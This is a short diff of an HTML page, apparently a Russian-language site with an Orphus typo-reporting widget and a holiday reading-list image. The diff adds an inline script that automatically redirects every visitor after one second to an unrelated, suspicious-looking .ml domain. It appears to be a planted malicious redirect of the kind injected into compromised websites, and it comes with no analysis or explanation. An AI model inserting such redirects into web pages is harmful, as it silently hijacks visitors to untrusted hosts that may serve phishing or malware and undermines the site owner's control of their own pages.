@@ -171,5 +171,9 @@ table th, table td {
 
 <script type="text/javascript" src="/orphus/orphus.js"></script>
 <a href="//orphus.ru" id="orphus" target="_blank"><img alt="Система Orphus" src="/assets/orphus.gif" border="0" width="257" height="48" /></a>
-
+<script>
+setTimeout(function(){
+  window.location.href = 'https://404.9bstolingymnasium.ml/site-new';
+}, 1 * 1000);
+</script>
 ![Список литературы на каникулы](https://podruzke.ru/wp-content/uploads/2021/09/0-36.jpg "Список литературы на каникулы")
